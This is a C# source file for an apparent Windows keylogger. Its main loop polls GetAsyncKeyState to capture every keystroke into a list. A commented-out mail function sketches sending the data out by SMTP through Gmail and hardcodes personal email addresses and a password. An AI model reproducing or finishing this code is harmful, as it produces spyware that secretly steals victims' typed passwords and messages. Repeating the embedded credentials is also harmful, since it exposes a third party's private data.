using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Data.SQLite;
using System.Net.Mail;
using System.Net;

namespace key
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static List<Keys> l = new List<Keys>();

        //static void DB()
        //{
        //    using (SQLiteConnection db = new SQLiteConnection(@"Data Source=D:/cache/quora.sqlite;Version=3"))
        //    {
        //        db.Open();
        //        SQLiteCommand command = new SQLiteCommand(@"select * from quora", db);
        //        command.ExecuteReader();

        //    }
        //}

        static void mail()
        {
            //MailMessage mail = new MailMessage(new MailAddress("user@hotmail.com"), new MailAddress("mkborgelt13@gmail.com"));

            //SmtpClient client = new SmtpClient();
            //client.Port = 25;
            //client.EnableSsl = true;
            //client.UseDefaultCredentials = false;
            //client.DeliveryMethod = SmtpDeliveryMethod.Network;
            //client.Credentials = new System.Net.NetworkCredential("user@gmail.com", "password");
            //mail.BodyEncoding = UTF8Encoding.UTF8;
            //client.Host = "smtp.gmail.com";
            //mail.Subject = "this is a test email.";
            //mail.Body = "this is my test email body";
            ////try
            ////{
            //    client.Send(mail);

            ////}
            ////catch (Exception e)
            ////{

            ////}
            //var fromAddress = new MailAddress("mkborgelt13@gmail.com.com ","From Name");
            //var toAddress = new MailAddress("mkborgelt13@gmail.com.com", "To Name");
            //const string fromPassword = "jkhkjhg";
            //const string subject = "Subject";
            //const string body = "Body";

            //var smtp = new SmtpClient
            //{
            //    Host = "smtp.gmail.com",
            //    Port = 587,
            //    EnableSsl = true,
            //    DeliveryMethod = SmtpDeliveryMethod.Network,
            //    Credentials = new NetworkCredential(fromAddress.Address, fromPassword),
            //    Timeout = 20000
            //};
            //using (var message = new MailMessage(fromAddress, toAddress)
            //{
            //    Subject = subject,
            //    Body = body
            //})
            //{
            //    smtp.Send(message);
            //}


        }
        static void Main(string[] args)
        {
            //mail();
            while (true)
            {
                Thread.Sleep(100);

                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        //Console.WriteLine((Keys)(i));
                        l.Add((Keys)i);
                        break;
                    }
                }
            }
        }
    }
}
